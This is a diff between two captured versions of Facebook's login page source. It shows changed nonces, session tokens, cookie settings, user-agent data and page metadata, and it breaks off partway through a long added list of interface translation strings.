@@ -2,9 +2,9 @@
 <html lang="en" id="facebook" class="no_js">
 
 <head>
-    <meta charset="utf-8" />
-    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
-    <script nonce="UOCoxRtA">
+    <meta charset="utf-8">
+    <meta name="referrer" content="default" id="meta_referrer">
+    <script nonce="FCNCmmhK">
         function envFlush(a) {
             function b(b) {
                 for (var c in a) b[c] = a[c]
@@ -14,24 +14,24 @@
         envFlush({
             "useTrustedTypes": false,
             "isTrustedTypesReportOnly": false,
-            "ajaxpipe_token": "AXi0nYwNSFzjaCXA-0c",
+            "ajaxpipe_token": "AXi0nYwNSFzjaCXAXSQ",
             "stack_trace_limit": 30,
             "timesliceBufferSize": 5000,
             "show_invariant_decoder": false,
-            "compat_iframe_token": "AUWh3v04ADrOVGKo-VfvQCiGMVA",
+            "compat_iframe_token": "AUWh3v04ADrOVGKo-VfvQCiGEsY",
             "isCQuick": false,
-            "brsid": "7477026657047531021"
+            "brsid": "7477023874000637589"
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         window.openDatabase && (window.openDatabase = function() {
             throw new Error()
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         _btldr = {};
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         (function() {
             function a(a) {
                 return a.parentElement !== document.body && a.parentElement !== document.head
@@ -83,38 +83,33 @@
             })
         })();
     </script>
-    <style nonce="UOCoxRtA"></style>
-    <script nonce="UOCoxRtA">
+    <style nonce="FCNCmmhK"></style>
+    <script nonce="FCNCmmhK">
         __DEV__ = 0;
     </script><noscript>
-        <meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
+        <meta http-equiv="refresh" content="0; URL=/login/device-based/regular/login/?login_attempt=1&amp;amp%3Blwv=120&amp;amp%3Blwc=1348131&amp;_fb_noscript=1">
     </noscript>
-    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
-    <title id="pageTitle">Facebook – log in or sign up</title>
-    <meta name="bingbot" content="noarchive" />
-    <meta property="og:site_name" content="Facebook" />
-    <meta property="og:url" content="https://www.facebook.com/" />
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
-    <meta property="og:locale" content="en_GB" />
-    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
-    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
-    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
-    <script type="application/ld+json" nonce="UOCoxRtA">
-        {
-            "\u0040context": "http:\/\/schema.org",
-            "\u0040type": "WebSite",
-            "name": "Facebook",
-            "url": "https:\/\/en-gb.facebook.com\/"
-        }
-    </script>
-    <link rel="canonical" href="https://www.facebook.com/" />
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
-    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/ze2gDvq5tcz.css" data-bootloader-hash="n+36Djy" crossorigin="anonymous" />
-    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y2/l/0,cross/mmo1oTsuuHp.css" data-bootloader-hash="wXaVolg" crossorigin="anonymous" />
-    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yJ/l/0,cross/-MH6mY1Za_K.css" data-bootloader-hash="fpPjFBD" crossorigin="anonymous" />
-    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yr/l/0,cross/r8l0oY44Pwc.css" data-bootloader-hash="/Bigw6+" crossorigin="anonymous" />
-    <script src="https://static.xx.fbcdn.net/rsrc.php/v4/yw/r/zqET9uOFLFP.js" data-bootloader-hash="/q7DUNa" crossorigin="anonymous"></script>
-    <script nonce="UOCoxRtA">
+    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/"
+        crossorigin="use-credentials">
+    <title id="pageTitle">Log into Facebook</title>
+    <meta name="bingbot" content="noarchive">
+    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
+    <meta property="og:site_name" content="Facebook">
+    <meta property="og:url" content="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;amp%3Blwv=120&amp;amp%3Blwc=1348131">
+    <meta property="og:locale" content="en_US">
+    <link rel="canonical" href="https://www.facebook.com/login/web/">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yg/l/0,cross/0apHDjQm9uC.css"
+        data-bootloader-hash="wXaVolg" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/GoSQySihKx7.css"
+        data-bootloader-hash="u4F94Jx" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yW/l/0,cross/UNRLHEeLAlH.css"
+        data-bootloader-hash="fpPjFBD" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yo/l/0,cross/BmlJrCjPDL7.css"
+        data-bootloader-hash="/Bigw6+" crossorigin="anonymous">
+    <script src="https://static.xx.fbcdn.net/rsrc.php/v4/yS/r/tAA75B6Z0gT.js"
+        data-bootloader-hash="/q7DUNa" crossorigin="anonymous"></script>
+    <script nonce="FCNCmmhK">
         requireLazy(["HasteSupportData"], function(m) {
             m.handle({
                 "clpData": {
@@ -269,7 +264,9 @@
                         "domain": "facebook.com"
                     }, 6421],
                     ["GetAsyncParamsExtraData", [], {
-                        "extra_data": {}
+                        "extra_data": {
+                            "__aaid": "0"
+                        }
                     }, 7511],
                     ["BootloaderConfig", [], {
                         "deferBootloads": false,
@@ -293,79 +290,53 @@
                         "translationRetryAbortTime": 50
                     }, 329],
                     ["CSSLoaderConfig", [], {
-                        "timeout": 5000,
-                        "loadEventSupported": true
+                        "timeout": 5000
                     }, 619],
                     ["CookieCoreConfig", [], {
-                        "alsfid": {
-                            "s": "Lax"
-                        },
+                        "alsfid": {},
                         "c_user": {
-                            "t": 31536000,
-                            "s": "None"
+                            "t": 31536000
                         },
                         "cppo": {
-                            "t": 86400,
-                            "s": "None"
+                            "t": 86400
                         },
                         "dpr": {
-                            "t": 604800,
-                            "s": "None"
+                            "t": 604800
                         },
                         "fbl_st": {
-                            "t": 31536000,
-                            "s": "Strict"
+                            "t": 31536000
                         },
-                        "hckd": {
-                            "s": "None"
-                        },
+                        "hckd": {},
                         "i_user": {
-                            "t": 31536000,
-                            "s": "None"
+                            "t": 31536000
                         },
                         "locale": {
-                            "t": 604800,
-                            "s": "None"
+                            "t": 604800
                         },
                         "m_ls": {
-                            "t": 34560000,
-                            "s": "None"
+                            "t": 34560000
                         },
                         "m_pixel_ratio": {
-                            "t": 604800,
-                            "s": "None"
+                            "t": 604800
                         },
-                        "noscript": {
-                            "s": "None"
-                        },
+                        "noscript": {},
                         "presence": {
-                            "t": 2592000,
-                            "s": "None"
+                            "t": 2592000
                         },
-                        "sfau": {
-                            "s": "None"
-                        },
-                        "usida": {
-                            "s": "None"
-                        },
+                        "sfau": {},
+                        "usida": {},
                         "vpd": {
-                            "t": 5184000,
-                            "s": "Lax"
+                            "t": 5184000
                         },
                         "wd": {
-                            "t": 604800,
-                            "s": "Lax"
+                            "t": 604800
                         },
                         "wl_cbv": {
-                            "t": 7776000,
-                            "s": "None"
+                            "t": 7776000
                         },
-                        "x-referer": {
-                            "s": "None"
-                        },
+                        "x-referer": {},
                         "x-src": {
-                            "t": 1,
-                            "s": "None"
+                            "t": 1
                         }
                     }, 2104],
                     ["CurrentUserInitialData", [], {
@@ -386,13 +357,13 @@
                         "IS_BUSINESS_DOMAIN": false
                     }, 270],
                     ["LSD", [], {
-                        "token": "AVqals1B0aE"
+                        "token": "AVr7z6QDX54"
                     }, 323],
                     ["ServerNonce", [], {
-                        "ServerNonce": "-ar2YgiCF513A-nwrpY7EX"
+                        "ServerNonce": "LJMn2KnvqKx8rIza6XOOaz"
                     }, 141],
                     ["SiteData", [], {
-                        "server_revision": 1020521505,
+                        "server_revision": 1020521215,
                         "client_revision": 1020521215,
                         "push_phase": "C3",
                         "pkg_cohort": "BP:DEFAULT",
@@ -404,9 +375,9 @@
                         "be_one_ahead": false,
                         "is_rtl": false,
                         "is_experimental_tier": false,
-                        "is_jit_warmed_up": false,
-                        "hsi": "7477026657047531021",
-                        "semr_host_bucket": "5",
+                        "is_jit_warmed_up": true,
+                        "hsi": "7477023874000637589",
+                        "semr_host_bucket": "",
                         "bl_hash_version": 2,
                         "comet_env": 0,
                         "wbloks_env": false,
@@ -415,8 +386,8 @@
                         "spin": 4,
                         "__spin_r": 1020521215,
                         "__spin_b": "trunk",
-                        "__spin_t": 1740880929,
-                        "vip": "157.240.15.35"
+                        "__spin_t": 1740880281,
+                        "vip": "2a03:2880:f10e:83:face:b00c:0:25de"
                     }, 317],
                     ["SprinkleConfig", [], {
                         "param_name": "jazoest",
@@ -424,18 +395,18 @@
                         "should_randomize": false
                     }, 2111],
                     ["UserAgentData", [], {
-                        "browserArchitecture": "64",
-                        "browserFullVersion": "133.0.0.0",
-                        "browserMinorVersion": 0,
-                        "browserName": "Chrome",
-                        "browserVersion": 133,
+                        "browserArchitecture": "32",
+                        "browserFullVersion": null,
+                        "browserMinorVersion": null,
+                        "browserName": "Unknown",
+                        "browserVersion": null,
                         "deviceName": "Unknown",
-                        "engineName": "Blink",
-                        "engineVersion": "133.0.0.0",
-                        "platformArchitecture": "64",
-                        "platformName": "Windows",
-                        "platformVersion": "10",
-                        "platformFullVersion": "10"
+                        "engineName": "Unknown",
+                        "engineVersion": null,
+                        "platformArchitecture": "32",
+                        "platformName": "Unknown",
+                        "platformVersion": null,
+                        "platformFullVersion": null
                     }, 527],
                     ["PromiseUsePolyfillSetImmediateGK", [], {
                         "www_always_use_polyfill_setimmediate": false
@@ -483,9 +454,9 @@
                         "endpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/"
                     }, 5094],
                     ["ServerTimeData", [], {
-                        "serverTime": 1740880929801,
-                        "timeOfRequestStart": 1740880929744.8,
-                        "timeOfResponseStart": 1740880929744.8
+                        "serverTime": 1740880281084,
+                        "timeOfRequestStart": 1740880281040,
+                        "timeOfResponseStart": 1740880281040
                     }, 5943],
                     ["BigPipeExperiments", [], {
                         "link_images_to_pagelets": false,
@@ -535,9 +506,6 @@
                         "useFetchStreamAjaxPipeTransport": true
                     }, 328],
                     ["DTSGInitialData", [], {}, 258],
-                    ["FbtQTOverrides", [], {
-                        "overrides": {}
-                    }, 551],
                     ["IntlPhonologicalRules", [], {
                         "meta": {
                             "\/_B\/": "([.,!?\\s]|^)",
@@ -563,7 +531,7 @@
                         "numberingSystemData": null
                     }, 54],
                     ["SessionNameConfig", [], {
-                        "seed": "11X3"
+                        "seed": "2Zzc"
                     }, 757],
                     ["ZeroCategoryHeader", [], {}, 1127],
                     ["ZeroRewriteRules", [], {
@@ -585,7 +553,7 @@
                             "\/fup\/interstitial\/": 1,
                             "\/work\/landing": 1,
                             "\/work\/login\/": 1,
-                            "\/work\/inputUsername\/": 1,
+                            "\/work\/email\/": 1,
                             "\/ai.php": 1,
                             "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                             "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
@@ -784,8 +752,259 @@
                         "inlineMode": "NO_INLINE"
                     }, 876],
                     ["AdsInterfacesSessionConfig", [], {}, 2393],
+                    ["FbtQTOverrides", [], {
+                        "overrides": {
+                            "1_000b6572c6a3f7fe9312e5879dd2e75b": "You'll need to log in with Workplace to continue this video chat.",
+                            "1_023ac1e3f0ce2980598584f26a784b9f": "Ignore messages",
+                            "1_028dc427119e6bfbfcd5eb2dd83b2a9e": "View Page status",
+                            "1_075684469438a60ae5f6813949e94a0d": "Get quote",
+                            "1_0778dc4cf3fe167942881fecddd5dee2": "Learn more",
+                            "1_08a3224cc0fd966f2bb0e780c51e6a0b": "New poll",
+                            "1_0a090165a1d0654210eb444114aabd7c": "Switch between accounts",
+                            "1_0b9af3d5b6a4de6cb2b17ad5a0beec3a": "Learn more",
+                            "1_0d0b40d72cd2adc492a402e98e18896f": "Chat notifications",
+                            "1_0ea6e742163878d88375800514788740": "Invite link",
+                            "1_0ea7de82b669cced737b30875f15309a": "Local event from Facebook",
+                            "1_0f008d2991187964d472eceaf9ba28d6": "Featured sticker packs",
+                            "1_0f48efb82ce58bf43dec6a98dcadc874": "Add your new number",
+                            "1_0f9fceeb2e66627d9e346dd24e0d6916": "Remove from channel",
+                            "1_0fee0283487e0259495a07f9e315ad8f": "Your home in Messenger",
+                            "1_1068c1352d8cbb8919cc2b4a0dbcd9f3": "Hide contact",
+                            "1_10811a6ece4ca15b10dc22f89805a347": "Customize your chat with {short-name}.",
+                            "1_117fb24f8ee951759e9435520cc71e70": "More options",
+                            "1_1248a8548f1b43fd3d9fc77baf835a04": "Contacts only",
+                            "1_1593f9d2cc4c63f196a61a70eff664cf": "Send to group",
+                            "1_159aa796a642d08a85379ec9693d25c7": "Opt in",
+                            "1_1736f6743cf12be3ffc46cd556357e96": "Book now",
+                            "1_18b8ec487f180574ad865f168eeafa70": "Content not found",
+                            "1_1905e45a72593e291dda8c774aa4caf4": "Invite people",
+                            "1_1ac128eda299351dc18567e7a6f31be6": "Hide video",
+                            "1_1b38f249fefb0fd5ef7912a1fe615d10": "Pinned location",
+                            "1_1b59f7e84dba4c8754cf60d1bafa6ae5": "Shared stories",
+                            "1_1cf36465e606a10ef2a48c5dee532085": "Great job, {user_name}!",
+                            "1_1d36c6e7b1a07971c84821452f9dc407": "Ignore conversation",
+                            "1_1d89beed629123cabeeea834c345a7fc": "Mute notifications",
+                            "1_1f209b12cabbe35509c514220825d53b": "New story",
+                            "1_209b3fb19e7c487ffe3bd85b2adac6db": "Try again",
+                            "1_20cec0b4386ad8555f8b619ad2c2fb81": "Single pop",
+                            "1_215afaeceab4d29970af2c11221f79e3": "Web visibility",
+                            "1_226d5171b148e60fe004a4f3cc53a81b": "Delete group chat?",
+                            "1_23f5a1596d301feaeb32b47f24dc73a0": "Join call",
+                            "1_243d55bab0d83c72b2113bfd5ca2e194": "Membership questions",
+                            "1_25589d7cb1db33911bf18252dbb5155c": "Message history in Inbox",
+                            "1_2745ba03fa7b9c0f59c0797fb44da204": "Showing in chats",
+                            "1_27f38b56fa58a394e2d89fbf7288747b": "New sender",
+                            "1_28ea9e6140b5437477564e5b21353246": "Profile picture",
+                            "1_2953f6f20942da4f0593b905a4db3d90": "See details",
+                            "1_2af4c8cb4d30a1aaa744a75187d6b06d": "{number} invited by you",
+                            "1_2b2898b200686215c54616553499fddf": "Unread messages",
+                            "1_2b406f4727fff3df7dd970cac1c41536": "Messenger preview",
+                            "1_2c2ff60e8d5edccadadf61f739b6d87b": "Report story",
+                            "1_3002f3a3232973642407c2e3830c10f6": "Stop sharing location",
+                            "1_30ed561a77bfcadb3b66d5960c2a9e05": "Photo reminders",
+                            "1_313c1c8a5025b45c60712685f0d89c6c": "App visibility",
+                            "1_33886f5d4a6ede055ec28ddf69251cc5": "Life events",
+                            "1_3543833b8b31fbb1561d46f2c0b266a8": "Added with theme",
+                            "1_366d38e456780d92844ab4b39ac1de78": "Not interested",
+                            "1_37900af383a573c0337521bca05d7955": "Respond to event",
+                            "1_37ebfbfd36c55a8366f7ba9d528cf7b3": "Chats you can create",
+                            "1_39339bb4b3f3002e589625a820bf5c7a": "Learn more",
+                            "1_3a9a1e192465754ec4427995fe1cffb4": "Buy and sell groups",
+                            "1_3aa3f2c2971602310d482c632c086db8": "Chat hosts",
+                            "1_3bc7a4f74be5e3dbfdc9b758fa779fff": "Chat plugin",
+                            "1_3cee79cd9e136ffc84ccfc7082bef6c2": "{number_of_happening_now_events} happening now, {number_of_upcoming_events} upcoming",
+                            "1_3e8fba90f69e371d19c5b4f79e3f0be7": "Buy and sell groups",
+                            "1_3f4c233aac1d71d17bee559b932144d3": "See conversation",
+                            "1_41446ff5d2de26a67626d2ba309c969b": "This video can't be sent",
+                            "1_4151657ef8e7bc03ab8169e5dcb0d675": "Cancel request",
+                            "1_41eadd6427237386cc04b60a8ab94a8b": "This chat will show as unread",
+                            "1_46793f5529ff4a62f831cf9218082b7f": "Unread requests",
+                            "1_46879d905028aaee9f7297d27c075b50": "See messages",
+                            "1_46b9f298de3c041a464dbe8ff7f3d978": "Language settings",
+                            "1_46c8d595559f4232c4a7fe113aac3093": "Get started",
+                            "1_475781e5e945e3d217b563d6ccd51ecd": "Create prompt",
+                            "1_489630491bec0288ae7c0bef88ff5ad9": "Show music picker",
+                            "1_4ad1c9e7de7af0b7d1853ed6863469db": "Snooze for {number_of_hours} hours",
+                            "1_4b56df30045efb8a5d21ec865d43ec1c": "Approved by you",
+                            "1_4b9736a9d6cbeb6249b0704870ec383e": "No devices yet",
+                            "1_4cf8fe13a0639e31c0d73b5aec3b8019": "Something went wrong",
+                            "1_4d5c8cbda9ac3dfc82b483ecf952a53c": "Open Facebook app",
+                            "1_4e75a018ef44c107750832d736fcce90": "Send details",
+                            "1_4ee7496edd4dafc3c2b2a6225f1a6f69": "Nearby places",
+                            "1_5009586cb3b7953608b1ccc56cb3e630": "See conversation?",
+                            "1_50c0e7742a3eb3800f3c2fdd5bce8f3a": "Admins & moderators",
+                            "1_531aa532255f18fbb4386d4ac4bf537d": "Search emoji",
+                            "1_53e9c4c2a53662ab23979d6cd79d4417": "Stop sharing",
+                            "1_5490d986c6908e35ac70ae79cca740fc": "Switch account",
+                            "1_55c0717e522433cf319a51f6ed6d4d09": "No messages",
+                            "1_55c2f7ac43fba60f684a0a0dfd01bb89": "Edit avatar",
+                            "1_55e31911698e89d3b19d4c703079cdf2": "{content} Learn more",
+                            "1_56d2098fc23416108de3ceae0fd6c158": "See link",
+                            "1_599d20d959e0009397c73fb9edb426dd": "Private post",
+                            "1_5af9abe8c5f4d9bcce27117d09ca6932": "Start call",
+                            "1_5e86ca443695bbd6605bcd169ee35a74": "Group updates",
+                            "1_5f0a4852946206863aa44a9ec3f87708": "Send to group",
+                            "1_60a7a58934bd27cbaf2058b53ff745f6": "Leave game",
+                            "1_60eb52f4ce4a109523fbfa8e90244331": "Live location",
+                            "1_617aeb029449c78895903ece88034b31": "Show picture-in-picture",
+                            "1_61cb9f934ffb6b5f8cc4cb95757125d4": "Invalid time",
+                            "1_6315107c7594ac961c8dac9aabbb957a": "Add to her picture",
+                            "1_64b1b9a14a334d3cce48f22f2b03e7c2": "Not now",
+                            "1_6544e705bd98780c45018863ca564aa1": "Block messages",
+                            "1_6582285731ad9288ac97889beeca82f3": "Avatar settings",
+                            "1_66402d631b18879269b46a49f95a0a4e": "Noise suppression",
+                            "1_6689492f38a51b5cb39982dd8a0e7f00": "Account details",
+                            "1_678bfb1d36a580695ccbb699c8fd1bd2": "Logging in\u2026",
+                            "1_6795cc13b37b3be61a143c35c9c65382": "Recently shared",
+                            "1_6a9a0529abd169ff91b49b4022dbf5a5": "Buy and sell groups",
+                            "1_6b124b9a53cd1299ad43ceef50dcd0e2": "Unread chats",
+                            "1_6d2f04c835bd2e9e555649e2f121fd5f": "Introducing AI stickers",
+                            "1_6dc5cc58c44e3791e14cdb69816e8a3f": "Product catalog terms",
+                            "1_6ec9c14f5b6103937c24960c6ae37947": "SMS messages",
+                            "1_7008293f762c6b49632496bd6aad21ff": "Suggested chats",
+                            "1_70190249ea4fa344ffbe77fd48af796f": "Pause chat?",
+                            "1_701d063f9d93574540e7a4aa27d2f86d": "Message reactions",
+                            "1_7052e2f38bec805609d7986562d34ed0": "Your reactions",
+                            "1_72920428a45b969c9dad788a656c323c": "Skip to details and actions",
+                            "1_7341e8b3089e0af586ed3b9682c2b5cf": "View call",
+                            "1_73761caf2fde503928bfdbd48c983136": "See conversation?",
+                            "1_7808c5327cf430807c173fa11ac0cc26": "Learn more",
+                            "1_7930f1b92ced21f16265c1ab07265964": "Chats you can join",
+                            "1_7bf132b7beb84dbc96f9cc6a1caef3a3": "Last name",
+                            "1_7c5789ad7c9455a96fa0b8d3edaf1dd0": "View profile",
+                            "1_7e3e738782f1887fbcebca5e62902a72": "See group",
+                            "1_7f626e74849fb5ad4a61825532fb6054": "Confirm your identity",
+                            "1_801af62106d995c8b376a512e2146039": "Block messages",
+                            "1_806d0518a4e1e599c196185438e2b79c": "Change image",
+                            "1_83a0754dbad2db42dcbe0e8900e6b48a": "AI-assisted message",
+                            "1_84698e2e6128e955605ddff2615c2771": "In transit",
+                            "1_88b60e4824d116c36468b700b6287e2f": "Your location",
+                            "1_8a1749bf031ab122983b76b370a86be3": "Learn more",
+                            "1_8bc33223ef4caf9b437b812c2772d946": "Create poll",
+                            "1_8c84ed97d7d84a31c72b1c75300a9461": "Delete chat?",
+                            "1_8dea727922641bc0de681cb214274b2f": "View AR object",
+                            "1_8e82c5b24398a0887342f439b66ce8c3": "{user}'s location",
+                            "1_8ea29d4da797ad3ae8fa2b3626b2a50c": "Disabled chat",
+                            "1_8ef9ffb962319c095470bb46de00beaa": "Current location",
+                            "1_9025bb6bcf560d6de6cfd22af6eaec97": "All chats menu",
+                            "1_9050fb0878cf1e782d24779cf780114c": "Recent calls",
+                            "1_91d783db2fb886ee4801ae5e0a86e04c": "Channel admin",
+                            "1_92255cd3d8f183d6dcb03b606a3445c2": "Recent searches",
+                            "1_925dfeb7269a4b97e5035aede422151c": "Upload contacts",
+                            "1_92b1a4d18dca5da9ac47d17733885fc2": "How to add friends on Messenger Kids",
+                            "1_93183c880d14f092e5d9617d9a246a74": "Read receipts",
+                            "1_939fba302a75b306e132ccb37e09a148": "Ignore group",
+                            "1_944401d1748eeaa9a66e62241477695e": "View details",
+                            "1_948415d2b551fa7c8b50376738732e5b": "Community members",
+                            "1_9626d7ac31beaf24bbd48f4842bf4744": "{num_activities} activities",
+                            "1_9645bee1f9dba4ee355d68df18cb1102": "Contact card",
+                            "1_96cc0d1d8acdfbcc9fe4623a53183f99": "No more posts",
+                            "1_983e4f9e7f9ecfdb8a2d0aa8247942de": "More conversations",
+                            "1_99dd31ad1b3145dfb03b7b4b097f28d5": "Send current location",
+                            "1_9ed1ff8f2501b81918e505f6e17fd362": "Send separately",
+                            "1_a1195adc52046789d21a0ae117244224": "Creating poll",
+                            "1_a12b852de26a50e5b6986edc7fa2705e": "Account created",
+                            "1_a2ed1fddb5b17414f3b7941385713361": "Suggested people",
+                            "1_a3d27f40032c3217f0934bcd46d52392": "Learn more",
+                            "1_a3f05430c2d2c4a7949a503649a0941d": "4 things to know about your information",
+                            "1_a4694c6ccbc990026015c70c944fe25e": "Cover photo",
+                            "1_a64a04c8ea9a8cf38124918e78c71b60": "You've blocked this account.",
+                            "1_a7a430455b6aaba0be1cf776314c8e70": "Learn more",
+                            "1_a7e141af65d2cd2dc972d3c094d2ce4f": "Charge your Bluetooth keys regularly.",
+                            "1_a8fd7153d9fbad9cece5913d6268813c": "Voice and video calling",
+                            "1_a96a641ba1f4b43910fab6d1b55c9b17": "Not now",
+                            "1_a9c08e1b18c1bceb358a7bf4a1aee0aa": "View profile",
+                            "1_ab80b68f0048ce8515584d069d120405": "Submit a report",
+                            "1_abd30739736c002c9a49c782066cbe86": "Save changes",
+                            "1_add682c72addd3a0d8b6fcab3720aadc": "Turn on",
+                            "1_aeb4b99dd7b73001a4f730b4a9120e04": "Try again",
+                            "1_aec2472fe4a2eaccb817d6111a4c0d39": "Video call",
+                            "1_af9c98d11efedfee4f1301601a67874a": "Double knock",
+                            "1_afc0eae78aa06ac4e92bf98ac3a03177": "Ignore group",
+                            "1_b0308bd1c93ff21594fabd353bda0a2a": "Red\/green",
+                            "1_b14ffeb649c54cac70fe09d9f7780889": "Open sticker, emoji and GIF keyboard.",
+                            "1_b22b6c4a8dd3ff71f35d007751cd87b0": "Get the Messenger app",
+                            "1_b2cea7ff1ee86133589fc73e5f2f3f9d": "You can turn this off at any time in your Parent Dashboard.",
+                            "1_b32cee1f96ea285d99c5ca73d4eb725f": "Date of birth",
+                            "1_b3dd269103f0d9b89d9bdb677dbd8887": "Invalid link",
+                            "1_b3ecf06a63fd5147cac3c083201ac7eb": "Data saver",
+                            "1_b42224e77c208d4ee532f212f5fe7a47": "Learn more",
+                            "1_b449f7098ace13c92ffc9bb9d5a5bb6f": "Live description (optional)",
+                            "1_b45945f81d03ceaf6f9441f2eeeec891": "Contact us",
+                            "1_b4c7d1e15b39ef2c3956027bb4d6cd11": "Placed on {date} \u00b7 Canceled",
+                            "1_b6392edec7f022a20e9867eb0b24de7b": "Featured Facebook photos",
+                            "1_b6f50b519cec90102cc5b62361a81288": "Mute notifications",
+                            "1_b81d470fc8105e7a7896e7cffb0ceeed": "Add contact",
+                            "1_b9143060878dce3a509e6bc2548b82f2": "Search for adults",
+                            "1_b997548b5fdd3a2dee73c3392135d911": "{number} invited by you",
+                            "1_ba4838bc3349d125cfb867715cada2f9": "Update build",
+                            "1_bbc5d4c00b66cc87bd1e6f8ab51fc102": "Call with video",
+                            "1_bbd9c674819da6d44ca09fa575180083": "Videos to send",
+                            "1_bc1a68f2efbc9ac36f13fe05f5d65e51": "Unmute notifications",
+                            "1_bc5ed53c58ed1544e3e014e9d7dee341": "Creating community",
+                            "1_bf841bb55b37d0620ef1b2bea096b95f": "You waved at {$recipient}.",
+                            "1_bfbf4cbd94a30fe78e2c6243fbaedb73": "No internet connection",
+                            "1_bfef0efc933e18bc735d53351af694e0": "Photos to send",
+                            "1_c174849dd6b0df72ce6c611bda774209": "Add option",
+                            "1_c21bf170fea995d887a6b64c13639323": "Double pop",
+                            "1_c6f4d12c2c30c1986800afdd50f373cd": "Preview chat",
+                            "1_c794c37e69d7f325e9a433f02ba8790b": "Message requests",
+                            "1_c8077b6c0597db47a0485bc0f32e9980": "Your avatar",
+                            "1_c921177d0d05ed9c9b95487f15422056": "Delete channel",
+                            "1_c94482ebd9b72b746183c50a4d4208d6": "Send a like",
+                            "1_cb73b265ac209451363883bed772c9bb": "Play together",
+                            "1_cc78ccf039dccf8d1dea818b85eab80d": "More people",
+                            "1_cd6b327676433f7b3c3515f206c0b82a": "{phone_number} \u2022 Phone contact",
+                            "1_cdc01fc97f5a6cf6ba07c7bcc4fe11e1": "Add question",
+                            "1_cde9138094eb836637af973172431d53": "{name1} wants to add {lastPendingKifTargetName} as a friend",
+                            "1_ce3d72055f43aaf90d886ab0017ca08c": "Recent articles",
+                            "1_cef77356ede0b83cf0465641b0719a42": "Problem with Bluetooth or audio source",
+                            "1_d29c32cd116f7833d1f496f064788d8c": "Report someone in this chat",
+                            "1_d3e1e228c31890a4aba20db8d31fd323": "Notification control",
+                            "1_d7bbd024b73557f1cf0914a38113498d": "Block messages",
+                            "1_d8de8ea2ef707a7aace4a752b147d8f1": "Mark as read",
+                            "1_d9f5379b09800045f33f218dc5408f64": "Welcome message",
+                            "1_dbd60e7eb18c870f9603d90f44f244ab": "Group chats",
+                            "1_dc6a01243c06b93a27cbe6c6d6c795f3": "Camera roll",
+                            "1_dcabb4806e92c408bd735494ddd92a6c": "Draw a necklace",
+                            "1_dee291c2ba2b66491a65be6138906278": "Hidden group",
+                            "1_df45795d00cab7a89a5557f9a392a7b2": "You opened this chat from {Origin Domain}",
+                            "1_df57e221cb0b224e5a0090f7dcef6677": "Forward limit reached",
+                            "1_df848a5c2d023027ac455f8321243645": "Report buyer",
+                            "1_e11f9f6dcd24ac5786c0eb8ff1851e1b": "Update information?",
+                            "1_e12cc3ec2ab93b6916804e5e1f6a336f": "Add to story",
+                            "1_e146ca287d980280ff6dabc5d32b2713": "Leave conversation?",
+                            "1_e250ac43039a943db6bd1855c02f6c39": "Learn more",
+                            "1_e27604669dde9743f8c4a735e650e5a6": "Thanks for being a superstar in this chat!",
+                            "1_e57e0918dc3eb089646890b6bb915dc0": "Choose kids for {name1}, {name2} and {name count} others to chat with",
+                            "1_e7861583dd9505c6c9a5dd36aca38d3b": "Unblock messages",
+                            "1_e809c2825e3b050976f7ca22f1532032": "Faster messaging",
+                            "1_e8d7d977b19c2aa1894496a663c986dc": "Blue\/yellow",
+                            "1_ea8ff502404e09cf262e602989d843d8": "Go to recent chats",
+                            "1_eceb9aa9398269f52436f1a1a7ee41b4": "Send to group",
+                            "1_ee9abb17ff7ad017ae988a02f8f5beae": "Top friends",
+                            "1_eec0e983014426e06f0c4077e7333275": "Unblock messages?",
+                            "1_ef4b4300b7a1f0319566068f5568c938": "Updating poll",
+                            "1_f165e0191456b0373edec046de3290d5": "Active now",
+                            "1_f2010c43a90ee7c3b7d6d3cab66ef06e": "Social networking",
+                            "1_f33ba2aba991e0820ccfef1ac81c4c14": "Recommended communities",
+                            "1_f580546da084946da3d6f61e3cc636da": "Channel settings",
+                            "1_f5d924ee511bdbc00c3dd05a10fe8260": "Please update your app",
+                            "1_f816fc32554f392be8655ee6db8f7dd5": "Continue with PayPal",
+                            "1_f90fb65f92ad8ac33f140b8be3c9eed1": "Invalid file format",
+                            "1_f919ada00521135434fd084a87e64542": "Add photos",
+                            "1_fa663c0ee32eeae58fd133765c35f905": "Learn more",
+                            "1_fba7ed548a73364cce9a2ad6e168b798": "Audio call",
+                            "1_fd3afb0fabe31263a19dac9f61fb0d4f": "Look up info",
+                            "1_fd7ada49a7f6f2ab82454ec27b9c6725": "Couldn't remove message",
+                            "1_fdf2eec743eaf4ee4b25a683f71525c6": "Add a profile picture",
